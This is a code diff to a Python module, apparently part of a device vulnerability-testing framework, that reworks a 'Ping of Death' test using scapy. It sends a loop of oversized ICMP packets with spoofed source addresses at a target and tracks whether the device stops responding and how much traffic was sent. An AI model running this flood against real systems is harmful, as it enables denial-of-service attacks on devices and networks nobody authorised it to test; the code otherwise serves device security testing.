@@ -3,9 +3,7 @@ from generic_attack import *
 import logging
 log = logging.getLogger(__name__)
 from scapy.all import *
-from re import search
-from subprocess import Popen
-from commands import getoutput
+import threading
 
 class PingOfDeath(GenericAttack):
 
@@ -16,50 +14,39 @@ class PingOfDeath(GenericAttack):
         self.running = True
         target = self.device['ip']
 
+        tstatus = threading.Thread(target=self.deviceStatus, args=(result,))
+        tstatus.start()
+        rand_addr = self.address_spoofer()
+        ip_hdr = IP(src=rand_addr, dst=target)
+        packet = ip_hdr / ICMP() / ("m" * 60000)  # send 60k bytes of junk
+
+        packetDataSize = len(packet)
+        start_time = time.time()
+        packetCount = 0
         while self.running:
             rand_addr = self.address_spoofer()
             ip_hdr = IP(src=rand_addr, dst=target)
             packet = ip_hdr / ICMP() / ("m" * 60000)  # send 60k bytes of junk
             send(packet)
+            packetCount = packetCount + 1
 
-            if not self.is_alive():
-                log.info('Host not responding!')
-                result.update({"status": "vulnerable"})
-                return
-
-        result.update({"status": "not_vulnerable"})
+        tstatus.join()
+        result.update({"directed_traffic(bytes/sec)": (packetCount * (packetDataSize + 40)) / (
+            time.time() - start_time), "attack_time:": (time.time() - start_time)})
         return
 
-    def is_alive(self):
-        """Check if the target is alive"""
-        if not self.device['ip'] is None:
-            rval = self.init_app('ping -c 1 -w 1 %s' % \
-                                 self.device['ip'], True)
-            up = search('\d.*? received', rval)
-            if search('0', up.group(0)) is None:
-                return True
-        return False
-
-    def init_app(self, prog, output=True):
-        """inititalize an application
-           PROG is the full command with args
-           OUTPUT true if output should be returned
-           false if output should be dumped to null.  This will
-           return a process handle and is meant for initializing
-           background processes.  Use wisely.
-        """
-        # dump output to null
-        if not output:
-            try:
-                null = open(os.devnull, 'w')
-                proc = Popen(prog, stdout=null, stderr=null)
-            except Exception, j:
-                log.error("Error initializing app: %s" % j)
-                return False
-            return proc
-        # just grab output
-        else:
-            return getoutput(prog)
+    def deviceStatus(self, result):
+        max = 5
+        detected = 0
+        while self.running:
+            if not self.is_alive():
+                detected = detected + 1
+                time.sleep(0.1)
+                if detected == max:
+                    result.update({"status": "vulnerable", "dos-status": "device not responding"})
+                    self.running = False
+                    return
+        result.update({"status": "not_vulnerable", "dos-status": "device responding"})
 
     def address_spoofer(self):
 
